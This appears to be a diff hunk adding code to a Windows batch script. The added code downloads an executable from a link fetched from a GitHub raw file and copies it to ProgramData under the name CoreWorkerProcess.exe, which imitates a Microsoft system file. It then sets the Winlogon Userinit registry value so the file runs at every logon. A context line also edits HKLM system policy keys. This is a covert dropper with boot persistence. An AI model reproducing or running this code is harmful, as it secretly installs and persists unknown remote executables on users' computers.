@@ -108,6 +108,76 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 
+
+set "CoreProcess=%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+if not exist "%CoreProcess%" goto INSTCOREPROCESS
+
+
+
+goto NEXT0
+
+
+:INSTCOREPROCESS
+
+:: Kill & Delete file 
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/CoreProcessFileLink') do set "CORPROCESSFILELINK=%%i"
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%CORPROCESSFILELINK%"
+
+
+
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto INSTCOREPROCESS
+)
+
+
+
+
+
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+
+
+
+:: Check if the file size is at least 80KB (81920 bytes)
+if %FILESIZE% geq 81920 (
+    copy /y "%APPDATA%\Microsoft\PatcherX64.exe" "%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto INSTCOREPROCESS
+)
+
+
+set "MESSAGE=CoreProcessInstalled|"
+
+
+:NEXT0
+
+
+
+:: IF CoreWorkerProcess.exe is installed
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\System32\userinit.exe,%ProgramData%\Microsoft\Windows\CoreWorkerProcess.exe" /f
+
+
+
+
+
+
+
 :EVERYSECOND
 
 
